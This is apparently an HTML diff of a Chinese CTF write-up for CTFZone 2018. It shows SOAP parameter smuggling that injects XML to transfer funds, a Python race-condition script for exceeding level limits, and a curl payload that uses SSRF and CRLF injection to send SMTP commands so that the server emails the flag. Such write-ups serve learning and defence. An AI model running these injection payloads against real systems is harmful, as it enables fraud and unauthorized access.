@@ -145,121 +145,98 @@
           
           
 
-          
-
-<h2 id="前言">前言</h2>
-
+          <h2 id="前言">前言</h2>
 <p>CTFZone 2018 整体上还是学习到一些新姿势了的，就是可惜情不自禁的摸起了鱼 (lll￢ω￢)</p>
-
 <h2 id="piggy-bank">Piggy-Bank</h2>
-
 <p>本题是 SOAP 相关的注入题，主要有以下 5 个页面：</p>
-
 <ul>
 <li>Profile - 个人信息页面，最关键的是上面的账号 ID 和账户余额</li>
 <li>Menu - 空白页面</li>
 <li>Transfer - 可以在账户间实现转账</li>
 <li>VIP - 只有当账户余额大于 1,000,000 才能访问，可以从中得到 flag</li>
-<li>For Developers - 该页面的注释提示我们可以访问隐藏的定义文件： <!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) --></li>
+<li>For Developers - 该页面的注释提示我们可以访问隐藏的定义文件： <!-- raw HTML omitted --></li>
 </ul>
-
 <p>通过注释，访问 <code>http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php</code> 可以得到对应 API 定义的 WSDL 文件</p>
-
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;wsdl:definitions name=&quot;Bank&quot;
-targetNamespace=&quot;urn:Bank&quot;
-xmlns:tns=&quot;urn:Bank&quot;
-xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;
-xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;
-xmlns:soapenc=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;
-xmlns:wsdl=&quot;http://schemas.xmlsoap.org/wsdl/&quot;
-xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;&gt;
-  &lt;message name=&quot;BalanceRequest&quot;&gt;
-    &lt;part name=&quot;wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
-  &lt;/message&gt;
-  &lt;message name=&quot;BalanceResponse&quot;&gt;
-    &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;
-    &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;
-  &lt;/message&gt;
-  &lt;message name=&quot;internalTransferRequest&quot;&gt;
-    &lt;part name=&quot;receiver_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
-    &lt;part name=&quot;sender_wallet_num&quot; type=&quot;xsd:decimal&quot;/&gt;
-    &lt;part name=&quot;amount&quot; type=&quot;xsd:float&quot;/&gt;
-    &lt;part name=&quot;token&quot; type=&quot;xsd:string&quot;/&gt;
-  &lt;/message&gt;
-  &lt;message name=&quot;internalTransferResponse&quot;&gt;
-    &lt;part name=&quot;code&quot; type=&quot;xsd:float&quot;/&gt;
-    &lt;part name=&quot;status&quot; type=&quot;xsd:string&quot;/&gt;
-  &lt;/message&gt;
-  &lt;portType name=&quot;BankServicePort&quot;&gt;
-    &lt;operation name=&quot;requestBalance&quot;&gt;
-      &lt;input message=&quot;tns:BalanceRequest&quot;/&gt;
-      &lt;output message=&quot;tns:BalanceResponse&quot;/&gt;
-    &lt;/operation&gt;
-    &lt;operation name=&quot;internalTransfer&quot;&gt;
-      &lt;input message=&quot;tns:internalTransferRequest&quot;/&gt;
-      &lt;output message=&quot;tns:internalTransferResponse&quot;/&gt;
-    &lt;/operation&gt;
-  &lt;/portType&gt;
-  &lt;binding name=&quot;BankServiceBinding&quot; type=&quot;tns:BankServicePort&quot;&gt;
-    &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;
-    &lt;operation name=&quot;requestBalance&quot;&gt;
-      &lt;soap:operation soapAction=&quot;urn:requestBalanceAction&quot;/&gt;
-      &lt;input&gt;
-        &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
-      &lt;/input&gt;
-      &lt;output&gt;
-        &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
-      &lt;/output&gt;
-    &lt;/operation&gt;
-    &lt;operation name=&quot;internalTransfer&quot;&gt;
-      &lt;soap:operation soapAction=&quot;urn:internalTransferAction&quot;/&gt;
-      &lt;input&gt;
-        &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
-      &lt;/input&gt;
-      &lt;output&gt;
-        &lt;soap:body use=&quot;encoded&quot; namespace=&quot;urn:Bank&quot; encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;/&gt;
-      &lt;/output&gt;
-    &lt;/operation&gt;
-  &lt;/binding&gt;
-  &lt;wsdl:service name=&quot;BankService&quot;&gt;
-    &lt;wsdl:port name=&quot;BankServicePort&quot; binding=&quot;tns:BankServiceBinding&quot;&gt;
-      &lt;soap:address location=&quot;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&quot; /&gt;
-    &lt;/wsdl:port&gt;
-  &lt;/wsdl:service&gt;
-&lt;/wsdl:definitions&gt;
-</code></pre>
-
-<p>通过 burp 的 wsdler 插件，我们能很方便地使用该文件定义好的 Web 服务：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/burp.png" alt="burp" class="lazyload"><figcaption class="image-caption">burp</figcaption></figure></p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+<span style="color:#f92672">&lt;wsdl:definitions</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Bank&#34;</span>
+<span style="color:#a6e22e">targetNamespace=</span><span style="color:#e6db74">&#34;urn:Bank&#34;</span>
+<span style="color:#a6e22e">xmlns:tns=</span><span style="color:#e6db74">&#34;urn:Bank&#34;</span>
+<span style="color:#a6e22e">xmlns:soap=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/wsdl/soap/&#34;</span>
+<span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span>
+<span style="color:#a6e22e">xmlns:soapenc=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span>
+<span style="color:#a6e22e">xmlns:wsdl=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/wsdl/&#34;</span>
+<span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/wsdl/&#34;</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;message</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;BalanceRequest&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;wallet_num&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:decimal&#34;</span><span style="color:#f92672">/&gt;</span>
+  <span style="color:#f92672">&lt;/message&gt;</span>
+  <span style="color:#f92672">&lt;message</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;BalanceResponse&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;code&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:float&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;status&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:string&#34;</span><span style="color:#f92672">/&gt;</span>
+  <span style="color:#f92672">&lt;/message&gt;</span>
+  <span style="color:#f92672">&lt;message</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;internalTransferRequest&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;receiver_wallet_num&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:decimal&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;sender_wallet_num&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:decimal&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;amount&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:float&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;token&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:string&#34;</span><span style="color:#f92672">/&gt;</span>
+  <span style="color:#f92672">&lt;/message&gt;</span>
+  <span style="color:#f92672">&lt;message</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;internalTransferResponse&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;code&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:float&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;part</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;status&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;xsd:string&#34;</span><span style="color:#f92672">/&gt;</span>
+  <span style="color:#f92672">&lt;/message&gt;</span>
+  <span style="color:#f92672">&lt;portType</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;BankServicePort&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;operation</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;requestBalance&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">message=</span><span style="color:#e6db74">&#34;tns:BalanceRequest&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;output</span> <span style="color:#a6e22e">message=</span><span style="color:#e6db74">&#34;tns:BalanceResponse&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;/operation&gt;</span>
+    <span style="color:#f92672">&lt;operation</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;internalTransfer&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">message=</span><span style="color:#e6db74">&#34;tns:internalTransferRequest&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;output</span> <span style="color:#a6e22e">message=</span><span style="color:#e6db74">&#34;tns:internalTransferResponse&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;/operation&gt;</span>
+  <span style="color:#f92672">&lt;/portType&gt;</span>
+  <span style="color:#f92672">&lt;binding</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;BankServiceBinding&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;tns:BankServicePort&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;soap:binding</span> <span style="color:#a6e22e">style=</span><span style="color:#e6db74">&#34;rpc&#34;</span> <span style="color:#a6e22e">transport=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/http&#34;</span><span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;operation</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;requestBalance&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;soap:operation</span> <span style="color:#a6e22e">soapAction=</span><span style="color:#e6db74">&#34;urn:requestBalanceAction&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;input&gt;</span>
+        <span style="color:#f92672">&lt;soap:body</span> <span style="color:#a6e22e">use=</span><span style="color:#e6db74">&#34;encoded&#34;</span> <span style="color:#a6e22e">namespace=</span><span style="color:#e6db74">&#34;urn:Bank&#34;</span> <span style="color:#a6e22e">encodingStyle=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;/input&gt;</span>
+      <span style="color:#f92672">&lt;output&gt;</span>
+        <span style="color:#f92672">&lt;soap:body</span> <span style="color:#a6e22e">use=</span><span style="color:#e6db74">&#34;encoded&#34;</span> <span style="color:#a6e22e">namespace=</span><span style="color:#e6db74">&#34;urn:Bank&#34;</span> <span style="color:#a6e22e">encodingStyle=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;/output&gt;</span>
+    <span style="color:#f92672">&lt;/operation&gt;</span>
+    <span style="color:#f92672">&lt;operation</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;internalTransfer&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;soap:operation</span> <span style="color:#a6e22e">soapAction=</span><span style="color:#e6db74">&#34;urn:internalTransferAction&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;input&gt;</span>
+        <span style="color:#f92672">&lt;soap:body</span> <span style="color:#a6e22e">use=</span><span style="color:#e6db74">&#34;encoded&#34;</span> <span style="color:#a6e22e">namespace=</span><span style="color:#e6db74">&#34;urn:Bank&#34;</span> <span style="color:#a6e22e">encodingStyle=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;/input&gt;</span>
+      <span style="color:#f92672">&lt;output&gt;</span>
+        <span style="color:#f92672">&lt;soap:body</span> <span style="color:#a6e22e">use=</span><span style="color:#e6db74">&#34;encoded&#34;</span> <span style="color:#a6e22e">namespace=</span><span style="color:#e6db74">&#34;urn:Bank&#34;</span> <span style="color:#a6e22e">encodingStyle=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#f92672">/&gt;</span>
+      <span style="color:#f92672">&lt;/output&gt;</span>
+    <span style="color:#f92672">&lt;/operation&gt;</span>
+  <span style="color:#f92672">&lt;/binding&gt;</span>
+  <span style="color:#f92672">&lt;wsdl:service</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;BankService&#34;</span><span style="color:#f92672">&gt;</span>
+    <span style="color:#f92672">&lt;wsdl:port</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;BankServicePort&#34;</span> <span style="color:#a6e22e">binding=</span><span style="color:#e6db74">&#34;tns:BankServiceBinding&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;soap:address</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php&#34;</span> <span style="color:#f92672">/&gt;</span>
+    <span style="color:#f92672">&lt;/wsdl:port&gt;</span>
+  <span style="color:#f92672">&lt;/wsdl:service&gt;</span>
+<span style="color:#f92672">&lt;/wsdl:definitions&gt;</span>
+</code></pre></div><p>通过 burp 的 wsdler 插件，我们能很方便地使用该文件定义好的 Web 服务：</p>
+<p><img src="/images/posts/CTFZone-2018/burp.png" alt="burp"></p>
 <p>通过简单使用，我们能发现这两个 Web 服务的作用</p>
-
 <h3 id="requestbalance">requestBalance</h3>
-
 <p>获得对应 id 用户的余额</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/requestBalance.png" alt="requestBalance" class="lazyload"><figcaption class="image-caption">requestBalance</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/requestBalance.png" alt="requestBalance"></p>
 <h3 id="internaltransfer">internalTransfer</h3>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/internalTransfer.png" alt="internalTransfer" class="lazyload"><figcaption class="image-caption">internalTransfer</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/internalTransfer.png" alt="internalTransfer"></p>
 <h3 id="attack">Attack</h3>
-
 <p>那么现在我们攻击的思路就非常明确了：</p>
-
 <ol>
 <li>通过遍历 id 的方式调用 requestBalance，获得余额超过百万用户的 id</li>
 <li>通过调用 internalTransfer 的方式将其的余额转至我们的名下</li>
 <li>从 VIP 页面获得 flag</li>
 </ol>
-
 <p>通过 burp 的 intruder 模块进行遍历，我们能很轻易的获得所有账户的余额</p>
-
 <p>然后下面就是希望直接通过转账的方式使我们的余额增加，但可以看到上面我们直接转账的尝试失败了，因为缺少了相应的 token，token 是由服务端生成的所以我们无法控制，这里也不存在一个泄露 token 的点，所以我们只能通过向服务端注入 xml 文件的方式进行攻击：</p>
-
 <pre><code>POST /home/transfer.php HTTP/1.1
 Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
 Content-Length: 21
@@ -275,102 +252,69 @@ Cookie: PHPSESSID=
 Connection: close
 
 receiver=1624&lt;/receiver_wallet_num&gt;&lt;amount&gt;1000000&lt;/amount&gt;&lt;sender_wallet_num&gt;1337&lt;/sender_wallet_num&gt;&lt;receiver_wallet_num&gt;1624&amp;amount=
-</code></pre>
-
-<p>此时服务端会接收到如下数据：</p>
-
-<pre><code class="language-xml">&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:urn=&quot;urn:Bank&quot;&gt;
-  &lt;soapenv:Header/&gt;
-  &lt;soapenv:Body&gt;
-    &lt;urn:internalTransfer soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
-      &lt;receiver_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;1624&lt;/receiver_wallet_num&gt;
-      &lt;amount&gt;1000000&lt;/amount&gt;
-      &lt;sender_wallet_num&gt;1337&lt;/sender_wallet_num&gt;
-      &lt;receiver_wallet_num&gt;1624&lt;/receiver_wallet_num&gt;
-      &lt;sender_wallet_num xsi:type=&quot;xsd:decimal&quot;&gt;2746.00&lt;/sender_wallet_num&gt;
-      &lt;amount xsi:type=&quot;xsd:float&quot;&gt;1.25&lt;/amount&gt;
-      &lt;token xsi:type=&quot;xsd:string&quot;&gt;xxxx&lt;/token&gt;
-    &lt;/urn:internalTransfer&gt;
-  &lt;/soapenv:Body&gt;
-&lt;/soapenv:Envelope&gt;
-</code></pre>
-
-<p>由于服务器只解析第一项作为相应参数，所以此时我们注入的 xml 条目将被解析，导致我们成功 hack 了转账流程，给自己增加了账户余额</p>
-
+</code></pre><p>此时服务端会接收到如下数据：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;soapenv:Envelope</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#a6e22e">xmlns:soapenv=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span style="color:#a6e22e">xmlns:urn=</span><span style="color:#e6db74">&#34;urn:Bank&#34;</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;soapenv:Header/&gt;</span>
+  <span style="color:#f92672">&lt;soapenv:Body&gt;</span>
+    <span style="color:#f92672">&lt;urn:internalTransfer</span> <span style="color:#a6e22e">soapenv:encodingStyle=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span style="color:#f92672">&gt;</span>
+      <span style="color:#f92672">&lt;receiver_wallet_num</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;xsd:decimal&#34;</span><span style="color:#f92672">&gt;</span>1624<span style="color:#f92672">&lt;/receiver_wallet_num&gt;</span>
+      <span style="color:#f92672">&lt;amount&gt;</span>1000000<span style="color:#f92672">&lt;/amount&gt;</span>
+      <span style="color:#f92672">&lt;sender_wallet_num&gt;</span>1337<span style="color:#f92672">&lt;/sender_wallet_num&gt;</span>
+      <span style="color:#f92672">&lt;receiver_wallet_num&gt;</span>1624<span style="color:#f92672">&lt;/receiver_wallet_num&gt;</span>
+      <span style="color:#f92672">&lt;sender_wallet_num</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;xsd:decimal&#34;</span><span style="color:#f92672">&gt;</span>2746.00<span style="color:#f92672">&lt;/sender_wallet_num&gt;</span>
+      <span style="color:#f92672">&lt;amount</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;xsd:float&#34;</span><span style="color:#f92672">&gt;</span>1.25<span style="color:#f92672">&lt;/amount&gt;</span>
+      <span style="color:#f92672">&lt;token</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;xsd:string&#34;</span><span style="color:#f92672">&gt;</span>xxxx<span style="color:#f92672">&lt;/token&gt;</span>
+    <span style="color:#f92672">&lt;/urn:internalTransfer&gt;</span>
+  <span style="color:#f92672">&lt;/soapenv:Body&gt;</span>
+<span style="color:#f92672">&lt;/soapenv:Envelope&gt;</span>
+</code></pre></div><p>由于服务器只解析第一项作为相应参数，所以此时我们注入的 xml 条目将被解析，导致我们成功 hack 了转账流程，给自己增加了账户余额</p>
 <h2 id="mmorpg-3000">MMORPG 3000</h2>
-
 <p>一个神奇的 RPG 游戏，你可以通过对战升级或者充钱两种方式变强</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/info.png" alt="Info" class="lazyload"><figcaption class="image-caption">Info</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/info.png" alt="Info"></p>
 <p>对战是不可能对战的，一辈子也不可能对战的，也就靠充钱这种方式才能变强了</p>
-
 <p>但问题是每个新注册的玩家只能获得 1 元的优惠券，这是完全不够的，怎么办呢？</p>
-
 <p>我们关注到优惠券的 url：<code>http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_69a5b5995110b36a9a347898d97a610e.png</code> 中 <code>69a5b5995110b36a9a347898d97a610e</code> 类似某种数据的 md5 值，使用 cmd5 查询后可得 1129，而此时用户的 id 是 129，由此可以推测对应的优惠券生成规则是 <code>md5('1'+id)</code>，所以我们尝试访问 id 为 1 用户对应的优惠券：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/coupon.png" alt="coupon" class="lazyload"><figcaption class="image-caption">coupon</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/coupon.png" alt="coupon"></p>
 <p>现在我们有着充足的金额，足够我们买到 100 级了，但在这里存在着一个极为尴尬的情况：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/levelup.png" alt="leveup" class="lazyload"><figcaption class="image-caption">leveup</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/levelup.png" alt="leveup"></p>
 <p>我们不能愉快的买买买了！！！</p>
-
 <p>升级又不可能升级的，所以我们只能尝试是否能够突破现在的等级限制，其中的一个思路即条件竞争，当我们同时发出升级的请求时，系统的处理不当，所以可能存在着这样一种特殊的场景：此时我们是 29 级，服务端先后接到了两个升级的请求，由于这两个请求到达时用户尚在 29 级，所以升级条件成立，此时用户成功升级到 31 级。基于这种思路，我们可以编写多线程的条件竞争脚本：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> threading
 
-<pre><code class="language-python">import requests
-import threading
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup&#34;</span>
 
-url = &quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup&quot;
+session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eyJ1aWQiOjEyOX0.DjjTig.8gYI8wcramg-dCXFSIlKjF_P61g&#34;</span>
 
-session = &quot;eyJ1aWQiOjEyOX0.DjjTig.8gYI8wcramg-dCXFSIlKjF_P61g&quot;
+max <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
 
-max = 100
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">levlup</span>(session):
+    requests<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;session&#34;</span>: session})
 
-def levlup(session):
-    requests.get(url, cookies={&quot;session&quot;: session})
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">race</span>():
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(max):
+        t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>levlup, args<span style="color:#f92672">=</span>(session,))
+        t<span style="color:#f92672">.</span>start()
 
-def race():
-    for i in range(max):
-        t = threading.Thread(target=levlup, args=(session,))
-        t.start()
-
-def main():
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
     race()
 
-if __name__ == '__main__':
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
     main()
-</code></pre>
-
-<p>此时我们成功升级到 35 级：
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/level35.png" alt="level 35" class="lazyload"><figcaption class="image-caption">level 35</figcaption></figure></p>
-
+</code></pre></div><p>此时我们成功升级到 35 级：
+<img src="/images/posts/CTFZone-2018/level35.png" alt="level 35"></p>
 <p>此时我们发现我们多了一个上传头像的功能：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/avatar.png" alt="avatar" class="lazyload"><figcaption class="image-caption">avatar</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/avatar.png" alt="avatar"></p>
 <p>此时推测这里存在着一个 SSRF 的漏洞（非常合理，笑</p>
-
 <p>但直接访问 127.0.0.1 或是 localhost 是会被拒绝的，但我们可以访问 0.0.0.0 呀，这里就可以开始扫描一波端口了</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/port.png" alt="port" class="lazyload"><figcaption class="image-caption">port</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/port.png" alt="port"></p>
 <p>扫完发现端口 25 是打开的状态，该端口对应的是 SMTP 协议，这里可以尝试 HTTP Header Inject</p>
-
 <p>简单说即让通过构造命令的方式让服务器向我们发送相应邮件，这里直接附上相应的 payload：</p>
-
-<pre><code class="language-shell">curl 'web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar' -H 'Cookie: session=eyJ1aWQiOjEyOX0.DjmXSw.pNA7u3H_ZtcQpSHIdN4nWCUfi3o' --data 'url=https://0.0.0.0%0d%0aMAIL FROM: &lt;A@B.C&gt;%0aRCPT TO: &lt;youremail@server.com&gt;%0aDATA%0aFROM: AAA@B.C%0aTO: youremail@server.com%0aSUBJECT: FLAG%0d%0a.%0d%0a%0aQUIT%0a:25&amp;action=save'
-</code></pre>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/email.png" alt="email" class="lazyload"><figcaption class="image-caption">email</figcaption></figure></p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl <span style="color:#e6db74">&#39;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar&#39;</span> -H <span style="color:#e6db74">&#39;Cookie: session=eyJ1aWQiOjEyOX0.DjmXSw.pNA7u3H_ZtcQpSHIdN4nWCUfi3o&#39;</span> --data <span style="color:#e6db74">&#39;url=https://0.0.0.0%0d%0aMAIL FROM: &lt;A@B.C&gt;%0aRCPT TO: &lt;youremail@server.com&gt;%0aDATA%0aFROM: AAA@B.C%0aTO: youremail@server.com%0aSUBJECT: FLAG%0d%0a.%0d%0a%0aQUIT%0a:25&amp;action=save&#39;</span>
+</code></pre></div><p><img src="/images/posts/CTFZone-2018/email.png" alt="email"></p>
 <p>上述思路就不知道大佬是怎么思考出来的了，真好奇.jpg</p>
-
 <h2 id="validator3000">Validator3000</h2>
-
 <p>一道 window 相关的逆向题，解题流程如下：</p>
-
 <ol>
 <li>运行 <code>Validator3000.exe</code> 程序</li>
 <li>点击 <code>Check Flag</code> button</li>
@@ -379,17 +323,13 @@ if __name__ == '__main__':
